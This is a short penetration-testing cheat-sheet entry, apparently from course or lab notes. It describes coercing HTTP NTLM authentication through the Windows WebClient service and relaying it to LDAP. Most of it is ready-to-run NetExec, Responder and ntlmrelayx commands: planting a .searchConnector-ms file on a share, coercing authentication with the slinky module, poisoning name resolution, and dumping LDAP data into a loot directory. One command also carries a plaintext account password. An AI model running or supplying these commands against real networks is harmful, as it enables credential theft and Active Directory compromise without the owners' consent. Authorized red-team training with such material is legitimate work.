# 12.13 WebDAV Attacks Coerce HTTP NTLM Auth

> Force HTTP NTLM via the WebClient service (`drop-sc` to start it) and relay to LDAP without signing restrictions.

## Overview

The WebClient service (enabled by default on workstations) allows coercion tools to force HTTP NTLM authentication instead of SMB. HTTP auth can then relay to LDAP without signing restrictions. Use drop-sc to start the WebClient service remotely if stopped, then use Slinky with a WebDAV connection string as the listener.

## Steps

- WebClient service runs by default on workstations but may be stopped
- Drop a .searchConnector-ms file (CME drop-sc) to auto-start WebClient on the target
- After WebClient starts, verify with CME webdav module
- Use Slinky SERVER=HOSTNAME@PORT (WebDAV connection string) to coerce HTTP auth
- Run Responder to poison the WebDAV hostname resolution (HTTP server On, SMB Off)
- Run ntlmrelayx with --http-port and --no-smb-server to receive HTTP on custom port and relay to LDAP

## Commands

### Drop searchConnector-ms

```bash
nxc smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://172.16.117.30/testing SHARE=smb FILENAME=@secret
```

### Verify WebDAV enabled

```bash
nxc smb 172.16.117.0/24 -u plaintext$ -p o6@ekK5#rlw2rAe -M webdav
```

### Slinky with WebDAV string

```bash
nxc smb 172.16.117.3 -u anonymous -p '' -M slinky -o SERVER=NOAREALNAME@8008 NAME=important
```

### ntlmrelayx HTTP port to LDAP

```bash
ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-smb-server --http-port 8008 --no-da --no-acl --no-validate-privs --lootdir ldap_dump
```
